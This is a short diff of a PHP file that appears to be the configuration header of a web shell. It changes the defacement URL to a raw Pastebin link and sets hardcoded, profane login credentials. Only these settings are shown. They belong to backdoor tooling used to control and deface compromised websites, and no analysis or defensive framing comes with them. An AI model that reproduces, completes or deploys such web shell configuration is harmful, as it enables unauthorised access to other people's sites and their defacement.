@@ -1,5 +1,5 @@
 <?php
-$deface_url='https://microsoft.com';
+$deface_url='http://pastebin.com/raw/xCjJQYHH';
 $UserName="fuck";
 $auth_pass="you";
 $color="#ABEFFA";
